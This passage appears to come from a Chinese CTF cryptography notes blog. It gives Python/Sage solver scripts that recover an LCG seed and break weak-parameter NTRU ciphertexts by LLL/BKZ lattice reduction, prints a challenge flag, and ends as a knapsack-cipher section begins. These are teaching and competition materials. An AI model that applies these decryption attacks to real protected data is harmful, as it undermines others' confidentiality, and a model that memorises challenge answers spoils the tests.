class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a,b</span>): </span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>): </span><br><span class="line">        <span class="keyword">return</span> a </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b) </span><br><span class="line">s =  [S1,S2,S3,S4,S5]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    t.append(s[i]-s[i-<span class="number">1</span>]) </span><br><span class="line">all_n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]))) </span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n=<span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a=(s[<span class="number">2</span>]-s[<span class="number">1</span>])*MMI((s[<span class="number">1</span>]-s[<span class="number">0</span>]),n)%n</span><br><span class="line">    ani=MMI(a,n)</span><br><span class="line">    b=(s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%n</span><br><span class="line">    seed = (ani*(s[<span class="number">0</span>]-b))%n</span><br><span class="line">    plaintext=seed</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(plaintext))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;NTRU_L0G_a6e_S1mpLe&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="简单的ntru-只有常数项">简单的NTRU(只有常数项)</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#构造格就行</span></span><br><span class="line">h = </span><br><span class="line">p = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"></span><br><span class="line"><span class="comment">#按题目推导 和ez_ntru的相同</span></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h4 id="一般多项式ntru">一般多项式NTRU</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造的格仍然是</span><br><span class="line">[</span><br><span class="line">[<span class="number">1</span>,h],</span><br><span class="line">[<span class="number">0</span>,p]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202309161645801.png" alt="image-20230916164432713"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">N =</span><br><span class="line">p =</span><br><span class="line">q =</span><br><span class="line">Q.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">P.&lt;y&gt; = Zmod(p)[]</span><br><span class="line"></span><br><span class="line">ex = </span><br><span class="line">hx = </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-------decrypt------&#x27;</span>)</span><br><span class="line">qq = x^N-<span class="number">1</span></span><br><span class="line">pp = y^N-<span class="number">1</span></span><br><span class="line">hn = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> hx.coefficients()]</span><br><span class="line">n = <span class="built_in">len</span>(hn)</span><br><span class="line">A1 = matrix.identity(n)</span><br><span class="line">A0 = matrix.zero(n)</span><br><span class="line">Aq = matrix.identity(n) * q</span><br><span class="line">Ah = matrix(ZZ, [hn[-i:] + hn[:-i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line">M = block_matrix([A1,Ah,A0,Aq],nrows=<span class="number">2</span>)</span><br><span class="line">L = M.LLL()</span><br><span class="line">v = L[<span class="number">0</span>]</span><br><span class="line">f = <span class="built_in">list</span>(v)[:n]</span><br><span class="line">g = <span class="built_in">list</span>(v)[n:]</span><br><span class="line">fx = Q(f)</span><br><span class="line">fy = P(f)</span><br><span class="line">gx = Q(g)</span><br><span class="line">Fqx = fx.inverse_mod(qq)</span><br><span class="line">Fpy = fy.inverse_mod(pp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hxx = (Fqx*gx).mod(x^N-1)</span></span><br><span class="line"><span class="comment">#print(hxx==hx)</span></span><br><span class="line"></span><br><span class="line">ax = (fx*ex).mod(qq)</span><br><span class="line">an = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ax.coefficients()]</span><br><span class="line"><span class="comment">#中心提升(centerlift)，使域范围从[0,q)变换到(-q/2,q/2)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(an)):</span><br><span class="line"><span class="keyword">if</span> an[i] &gt; q//<span class="number">2</span>:</span><br><span class="line">an[i] -= q</span><br><span class="line">ax = P(an)</span><br><span class="line"><span class="built_in">print</span>(ax)</span><br><span class="line">out = (Fpy * ax).mod(pp)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out.coefficients()))</span><br></pre></td></tr></table></figure><p>脚本2</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">160</span></span><br><span class="line">d = <span class="number">30</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">65536</span></span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line"></span><br><span class="line">pubkey = -<span class="number">11891</span>*x^<span class="number">159</span> + <span class="number">16347</span>*x^<span class="number">158</span> - <span class="number">32137</span>*x^<span class="number">157</span> + <span class="number">14988</span>*x^<span class="number">156</span> + <span class="number">16657</span>*x^<span class="number">155</span> - <span class="number">25785</span>*x^<span class="number">154</span> - <span class="number">21976</span>*x^<span class="number">153</span> - <span class="number">31745</span>*x^<span class="number">152</span> - <span class="number">4232</span>*x^<span class="number">151</span> + <span class="number">29569</span>*x^<span class="number">150</span> + <span class="number">27140</span>*x^<span class="number">149</span> + <span class="number">19617</span>*x^<span class="number">148</span> - <span class="number">16656</span>*x^<span class="number">147</span> + <span class="number">8925</span>*x^<span class="number">146</span> + <span class="number">8728</span>*x^<span class="number">145</span> - <span class="number">8802</span>*x^<span class="number">144</span> - <span class="number">10794</span>*x^<span class="number">143</span> - <span class="number">28159</span>*x^<span class="number">142</span> - <span class="number">6454</span>*x^<span class="number">141</span> - <span class="number">10259</span>*x^<span class="number">140</span> - <span class="number">19169</span>*x^<span class="number">139</span> - <span class="number">14357</span>*x^<span class="number">138</span> + <span class="number">3501</span>*x^<span class="number">137</span> + <span class="number">9885</span>*x^<span class="number">136</span> - <span class="number">7441</span>*x^<span class="number">135</span> + <span class="number">18268</span>*x^<span class="number">134</span> - <span class="number">27183</span>*x^<span class="number">133</span> + <span class="number">26085</span>*x^<span class="number">132</span> + <span class="number">19147</span>*x^<span class="number">131</span> + <span class="number">17153</span>*x^<span class="number">130</span> - <span class="number">22887</span>*x^<span class="number">129</span> + <span class="number">32476</span>*x^<span class="number">128</span> - <span class="number">21698</span>*x^<span class="number">127</span> + <span class="number">19138</span>*x^<span class="number">126</span> + <span class="number">11585</span>*x^<span class="number">125</span> + <span class="number">22755</span>*x^<span class="number">124</span> - <span class="number">5920</span>*x^<span class="number">123</span> + <span class="number">7581</span>*x^<span class="number">122</span> + <span class="number">25973</span>*x^<span class="number">121</span> + <span class="number">13787</span>*x^<span class="number">120</span> - <span class="number">22762</span>*x^<span class="number">119</span> + <span class="number">29207</span>*x^<span class="number">118</span> - <span class="number">17916</span>*x^<span class="number">117</span> - <span class="number">11502</span>*x^<span class="number">116</span> + <span class="number">18275</span>*x^<span class="number">115</span> + <span class="number">318</span>*x^<span class="number">114</span> - <span class="number">6890</span>*x^<span class="number">113</span> - <span class="number">22751</span>*x^<span class="number">112</span> - <span class="number">27677</span>*x^<span class="number">111</span> - <span class="number">11114</span>*x^<span class="number">110</span> + <span class="number">8623</span>*x^<span class="number">109</span> - <span class="number">15725</span>*x^<span class="number">108</span> - <span class="number">6835</span>*x^<span class="number">107</span> - <span class="number">8288</span>*x^<span class="number">106</span> - <span class="number">5235</span>*x^<span class="number">105</span> - <span class="number">28697</span>*x^<span class="number">104</span> + <span class="number">10696</span>*x^<span class="number">103</span> + <span class="number">17117</span>*x^<span class="number">102</span> + <span class="number">24696</span>*x^<span class="number">101</span> - <span class="number">7801</span>*x^<span class="number">100</span> - <span class="number">31874</span>*x^<span class="number">99</span> - <span class="number">17668</span>*x^<span class="number">98</span> - <span class="number">11204</span>*x^<span class="number">97</span> + <span class="number">19147</span>*x^<span class="number">96</span> + <span class="number">24644</span>*x^<span class="number">95</span> - <span class="number">29380</span>*x^<span class="number">94</span> - <span class="number">26237</span>*x^<span class="number">93</span> - <span class="number">27390</span>*x^<span class="number">92</span> + <span class="number">19982</span>*x^<span class="number">91</span> + <span class="number">4074</span>*x^<span class="number">90</span> - <span class="number">17248</span>*x^<span class="number">89</span> - <span class="number">11027</span>*x^<span class="number">88</span> - <span class="number">32690</span>*x^<span class="number">87</span> + <span class="number">5124</span>*x^<span class="number">86</span> - <span class="number">20823</span>*x^<span class="number">85</span> - <span class="number">11779</span>*x^<span class="number">84</span> + <span class="number">13781</span>*x^<span class="number">83</span> + <span class="number">29356</span>*x^<span class="number">82</span> - <span class="number">9740</span>*x^<span class="number">81</span> - <span class="number">31484</span>*x^<span class="number">80</span> - <span class="number">540</span>*x^<span class="number">79</span> + <span class="number">32360</span>*x^<span class="number">78</span> + <span class="number">24795</span>*x^<span class="number">77</span> - <span class="number">8864</span>*x^<span class="number">76</span> + <span class="number">17363</span>*x^<span class="number">75</span> + <span class="number">9670</span>*x^<span class="number">74</span> + <span class="number">32268</span>*x^<span class="number">73</span> + <span class="number">17961</span>*x^<span class="number">72</span> + <span class="number">6388</span>*x^<span class="number">71</span> + <span class="number">580</span>*x^<span class="number">70</span> + <span class="number">128</span>*x^<span class="number">69</span> + <span class="number">339</span>*x^<span class="number">68</span> + <span class="number">3412</span>*x^<span class="number">67</span> - <span class="number">4519</span>*x^<span class="number">66</span> - <span class="number">25056</span>*x^<span class="number">65</span> + <span class="number">6096</span>*x^<span class="number">64</span> + <span class="number">18720</span>*x^<span class="number">63</span> - <span class="number">5338</span>*x^<span class="number">62</span> + <span class="number">16910</span>*x^<span class="number">61</span> + <span class="number">3353</span>*x^<span class="number">60</span> + <span class="number">15433</span>*x^<span class="number">59</span> - <span class="number">28053</span>*x^<span class="number">58</span> - <span class="number">18883</span>*x^<span class="number">57</span> + <span class="number">7688</span>*x^<span class="number">56</span> - <span class="number">31198</span>*x^<span class="number">55</span> + <span class="number">9950</span>*x^<span class="number">54</span> - <span class="number">9388</span>*x^<span class="number">53</span> + <span class="number">21235</span>*x^<span class="number">52</span> + <span class="number">2847</span>*x^<span class="number">51</span> + <span class="number">24383</span>*x^<span class="number">50</span> + <span class="number">19431</span>*x^<span class="number">49</span> + <span class="number">21244</span>*x^<span class="number">48</span> - <span class="number">8498</span>*x^<span class="number">47</span> - <span class="number">28998</span>*x^<span class="number">46</span> + <span class="number">962</span>*x^<span class="number">45</span> + <span class="number">20579</span>*x^<span class="number">44</span> + <span class="number">28002</span>*x^<span class="number">43</span> - <span class="number">6040</span>*x^<span class="number">42</span> + <span class="number">4241</span>*x^<span class="number">41</span> + <span class="number">11655</span>*x^<span class="number">40</span> - <span class="number">32419</span>*x^<span class="number">39</span> + <span class="number">21531</span>*x^<span class="number">38</span> + <span class="number">7348</span>*x^<span class="number">37</span> - <span class="number">5503</span>*x^<span class="number">36</span> + <span class="number">29820</span>*x^<span class="number">35</span> + <span class="number">28896</span>*x^<span class="number">34</span> + <span class="number">8754</span>*x^<span class="number">33</span> + <span class="number">17978</span>*x^<span class="number">32</span> + <span class="number">7552</span>*x^<span class="number">31</span> + <span class="number">27240</span>*x^<span class="number">30</span> - <span class="number">29515</span>*x^<span class="number">29</span> - <span class="number">20322</span>*x^<span class="number">28</span> + <span class="number">2201</span>*x^<span class="number">27</span> + <span class="number">8857</span>*x^<span class="number">26</span> - <span class="number">50</span>*x^<span class="number">25</span> - <span class="number">3780</span>*x^<span class="number">24</span> - <span class="number">12138</span>*x^<span class="number">23</span> + <span class="number">10893</span>*x^<span class="number">22</span> + <span class="number">23133</span>*x^<span class="number">21</span> + <span class="number">6142</span>*x^<span class="number">20</span> - <span class="number">23798</span>*x^<span class="number">19</span> - <span class="number">15236</span>*x^<span class="number">18</span> + <span class="number">32564</span>*x^<span class="number">17</span> + <span class="number">25683</span>*x^<span class="number">16</span> - <span class="number">24010</span>*x^<span class="number">15</span> - <span class="number">4355</span>*x^<span class="number">14</span> + <span class="number">22552</span>*x^<span class="number">13</span> - <span class="number">27155</span>*x^<span class="number">12</span> + <span class="number">27649</span>*x^<span class="number">11</span> + <span class="number">17781</span>*x^<span class="number">10</span> + <span class="number">7115</span>*x^<span class="number">9</span> + <span class="number">27465</span>*x^<span class="number">8</span> - <span class="number">4369</span>*x^<span class="number">7</span> + <span class="number">24882</span>*x^<span class="number">6</span> - <span class="number">11675</span>*x^<span class="number">5</span> - <span class="number">612</span>*x^<span class="number">4</span> + <span class="number">12361</span>*x^<span class="number">3</span> + <span class="number">20120</span>*x^<span class="number">2</span> + <span class="number">6190</span>*x - <span class="number">10843</span></span><br><span class="line">pubkey = R(pubkey)</span><br><span class="line">c = -<span class="number">26801</span>*x^<span class="number">159</span> - <span class="number">25103</span>*x^<span class="number">158</span> + <span class="number">29811</span>*x^<span class="number">157</span> - <span class="number">12251</span>*x^<span class="number">156</span> - <span class="number">13386</span>*x^<span class="number">155</span> - <span class="number">28030</span>*x^<span class="number">154</span> - <span class="number">16511</span>*x^<span class="number">153</span> + <span class="number">23761</span>*x^<span class="number">152</span> + <span class="number">28329</span>*x^<span class="number">151</span> - <span class="number">16406</span>*x^<span class="number">150</span> + <span class="number">30931</span>*x^<span class="number">149</span> + <span class="number">5326</span>*x^<span class="number">148</span> + <span class="number">19877</span>*x^<span class="number">147</span> - <span class="number">23165</span>*x^<span class="number">146</span> - <span class="number">31540</span>*x^<span class="number">145</span> - <span class="number">7923</span>*x^<span class="number">144</span> + <span class="number">5880</span>*x^<span class="number">143</span> - <span class="number">27078</span>*x^<span class="number">142</span> - <span class="number">25436</span>*x^<span class="number">141</span> - <span class="number">17162</span>*x^<span class="number">140</span> + <span class="number">1471</span>*x^<span class="number">139</span> + <span class="number">14486</span>*x^<span class="number">138</span> + <span class="number">7702</span>*x^<span class="number">137</span> - <span class="number">29890</span>*x^<span class="number">136</span> + <span class="number">29315</span>*x^<span class="number">135</span> + <span class="number">558</span>*x^<span class="number">134</span> - <span class="number">22429</span>*x^<span class="number">133</span> - <span class="number">361</span>*x^<span class="number">132</span> + <span class="number">19049</span>*x^<span class="number">131</span> - <span class="number">30437</span>*x^<span class="number">130</span> - <span class="number">32610</span>*x^<span class="number">129</span> - <span class="number">3024</span>*x^<span class="number">128</span> - <span class="number">4313</span>*x^<span class="number">127</span> + <span class="number">29174</span>*x^<span class="number">126</span> - <span class="number">2837</span>*x^<span class="number">125</span> - <span class="number">2812</span>*x^<span class="number">124</span> + <span class="number">13450</span>*x^<span class="number">123</span> - <span class="number">15001</span>*x^<span class="number">122</span> - <span class="number">25791</span>*x^<span class="number">121</span> - <span class="number">8702</span>*x^<span class="number">120</span> - <span class="number">4968</span>*x^<span class="number">119</span> - <span class="number">15340</span>*x^<span class="number">118</span> + <span class="number">31744</span>*x^<span class="number">117</span> - <span class="number">32478</span>*x^<span class="number">116</span> + <span class="number">19737</span>*x^<span class="number">115</span> - <span class="number">12629</span>*x^<span class="number">114</span> - <span class="number">27847</span>*x^<span class="number">113</span> + <span class="number">27322</span>*x^<span class="number">112</span> - <span class="number">31375</span>*x^<span class="number">111</span> + <span class="number">14777</span>*x^<span class="number">110</span> + <span class="number">29825</span>*x^<span class="number">109</span> - <span class="number">25883</span>*x^<span class="number">108</span> - <span class="number">13335</span>*x^<span class="number">107</span> + <span class="number">32517</span>*x^<span class="number">106</span> + <span class="number">14871</span>*x^<span class="number">105</span> - <span class="number">7287</span>*x^<span class="number">104</span> + <span class="number">13398</span>*x^<span class="number">103</span> - <span class="number">32710</span>*x^<span class="number">102</span> + <span class="number">20805</span>*x^<span class="number">101</span> + <span class="number">29734</span>*x^<span class="number">100</span> - <span class="number">14579</span>*x^<span class="number">99</span> + <span class="number">17483</span>*x^<span class="number">98</span> - <span class="number">16864</span>*x^<span class="number">97</span> - <span class="number">26745</span>*x^<span class="number">96</span> + <span class="number">3254</span>*x^<span class="number">95</span> + <span class="number">7280</span>*x^<span class="number">94</span> - <span class="number">29046</span>*x^<span class="number">93</span> - <span class="number">7531</span>*x^<span class="number">92</span> - <span class="number">8791</span>*x^<span class="number">91</span> + <span class="number">15033</span>*x^<span class="number">90</span> - <span class="number">1125</span>*x^<span class="number">89</span> - <span class="number">14713</span>*x^<span class="number">88</span> - <span class="number">12273</span>*x^<span class="number">87</span> + <span class="number">8616</span>*x^<span class="number">86</span> + <span class="number">2486</span>*x^<span class="number">85</span> + <span class="number">31810</span>*x^<span class="number">84</span> + <span class="number">27795</span>*x^<span class="number">83</span> - <span class="number">21731</span>*x^<span class="number">82</span> + <span class="number">21743</span>*x^<span class="number">81</span> - <span class="number">27595</span>*x^<span class="number">80</span> - <span class="number">3592</span>*x^<span class="number">79</span> - <span class="number">27206</span>*x^<span class="number">78</span> - <span class="number">32156</span>*x^<span class="number">77</span> + <span class="number">32124</span>*x^<span class="number">76</span> - <span class="number">11212</span>*x^<span class="number">75</span> - <span class="number">6662</span>*x^<span class="number">74</span> - <span class="number">23103</span>*x^<span class="number">73</span> - <span class="number">3660</span>*x^<span class="number">72</span> - <span class="number">31043</span>*x^<span class="number">71</span> - <span class="number">17131</span>*x^<span class="number">70</span> + <span class="number">24544</span>*x^<span class="number">69</span> - <span class="number">32326</span>*x^<span class="number">68</span> - <span class="number">31047</span>*x^<span class="number">67</span> + <span class="number">19814</span>*x^<span class="number">66</span> + <span class="number">10874</span>*x^<span class="number">65</span> - <span class="number">8449</span>*x^<span class="number">64</span> + <span class="number">11744</span>*x^<span class="number">63</span> + <span class="number">2245</span>*x^<span class="number">62</span> - <span class="number">967</span>*x^<span class="number">61</span> + <span class="number">9120</span>*x^<span class="number">60</span> + <span class="number">8983</span>*x^<span class="number">59</span> - <span class="number">24573</span>*x^<span class="number">58</span> + <span class="number">24885</span>*x^<span class="number">57</span> + <span class="number">15649</span>*x^<span class="number">56</span> - <span class="number">18970</span>*x^<span class="number">55</span> + <span class="number">7354</span>*x^<span class="number">54</span> - <span class="number">12282</span>*x^<span class="number">53</span> - <span class="number">22474</span>*x^<span class="number">52</span> + <span class="number">4395</span>*x^<span class="number">51</span> + <span class="number">8428</span>*x^<span class="number">50</span> - <span class="number">32592</span>*x^<span class="number">49</span> + <span class="number">25980</span>*x^<span class="number">48</span> - <span class="number">4599</span>*x^<span class="number">47</span> + <span class="number">16310</span>*x^<span class="number">46</span> + <span class="number">18559</span>*x^<span class="number">45</span> + <span class="number">22897</span>*x^<span class="number">44</span> + <span class="number">19080</span>*x^<span class="number">43</span> - <span class="number">26065</span>*x^<span class="number">42</span> - <span class="number">9</span>*x^<span class="number">41</span> + <span class="number">29202</span>*x^<span class="number">40</span> + <span class="number">2121</span>*x^<span class="number">39</span> - <span class="number">5004</span>*x^<span class="number">38</span> + <span class="number">5299</span>*x^<span class="number">37</span> - <span class="number">28301</span>*x^<span class="number">36</span> - <span class="number">13519</span>*x^<span class="number">35</span> + <span class="number">24241</span>*x^<span class="number">34</span> + <span class="number">529</span>*x^<span class="number">33</span> - <span class="number">20574</span>*x^<span class="number">32</span> - <span class="number">27391</span>*x^<span class="number">31</span> + <span class="number">31976</span>*x^<span class="number">30</span> + <span class="number">22824</span>*x^<span class="number">29</span> - <span class="number">31410</span>*x^<span class="number">28</span> - <span class="number">20976</span>*x^<span class="number">27</span> + <span class="number">21661</span>*x^<span class="number">26</span> - <span class="number">15132</span>*x^<span class="number">25</span> + <span class="number">1905</span>*x^<span class="number">24</span> - <span class="number">30870</span>*x^<span class="number">23</span> + <span class="number">18109</span>*x^<span class="number">22</span> - <span class="number">17373</span>*x^<span class="number">21</span> + <span class="number">5342</span>*x^<span class="number">20</span> - <span class="number">22447</span>*x^<span class="number">19</span> + <span class="number">1893</span>*x^<span class="number">18</span> - <span class="number">17545</span>*x^<span class="number">17</span> + <span class="number">30097</span>*x^<span class="number">16</span> - <span class="number">21731</span>*x^<span class="number">15</span> + <span class="number">17390</span>*x^<span class="number">14</span> + <span class="number">10991</span>*x^<span class="number">13</span> - <span class="number">5384</span>*x^<span class="number">12</span> + <span class="number">15960</span>*x^<span class="number">11</span> + <span class="number">24268</span>*x^<span class="number">10</span> - <span class="number">29867</span>*x^<span class="number">9</span> + <span class="number">22532</span>*x^<span class="number">8</span> + <span class="number">10133</span>*x^<span class="number">7</span> - <span class="number">26576</span>*x^<span class="number">6</span> - <span class="number">5742</span>*x^<span class="number">5</span> - <span class="number">16252</span>*x^<span class="number">4</span> + <span class="number">13019</span>*x^<span class="number">3</span> - <span class="number">25984</span>*x^<span class="number">2</span> + <span class="number">14004</span>*x + <span class="number">22500</span></span><br><span class="line">c = R(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">balance_mod</span>(<span class="params">f, q</span>):</span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_prime</span>(<span class="params">f, p</span>):</span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">c, prikey</span>):</span><br><span class="line">    f, fp = prikey</span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="keyword">return</span> balance_mod(a * fp, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">pubkey, c</span>):</span><br><span class="line">    A = Matrix(ZZ, <span class="number">2</span> * n, <span class="number">2</span> * n)</span><br><span class="line">    hp = inverse(p, q) * pubkey</span><br><span class="line">    hp_list = <span class="built_in">list</span>(hp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A[i, i] = q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">2</span> * n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            A[i, j] = hp_list[(j - i) % n]</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">    AL = A.BKZ()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> AL:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = R(row[n:].<span class="built_in">list</span>())</span><br><span class="line">            fp = invert_mod_prime(f, p)</span><br><span class="line">            <span class="keyword">return</span> dec(c, (f, fp))</span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># may failed with shortest vector(return more if failed)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">m = crack(pubkey, c)</span><br><span class="line"></span><br><span class="line">m = m.<span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    m[i] += <span class="number">1</span></span><br><span class="line">    m[i] = <span class="built_in">str</span>(m[i])</span><br><span class="line">str1 = <span class="string">&quot;&quot;</span>.join(m[::-<span class="number">1</span>])</span><br><span class="line">temp = <span class="built_in">int</span>(str1,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(temp))</span><br></pre></td></tr></table></figure><h4 id="ntru变形">ntru变形</h4><p>重新推一下关系式构造格 不变形的ntru是</p><p>c 同余 rf^-1g + m mod p</p><p>构造[[1,h],[0,p]]</p><p>能解出f g 然后数学推导回m就行</p><h3 id="背包密码">背包密码</h3><p><strong>参数：</strong></p><blockquote><ul><li>私钥：超递增序列  每一个数要比前面的全部数之和还要大</li><li>模数：m  大于超递增序列的全部和</li><li>乘数：w  满足和模数m互素  即gcd(w,m)=1</li><li>公钥：b 同余 wai mod 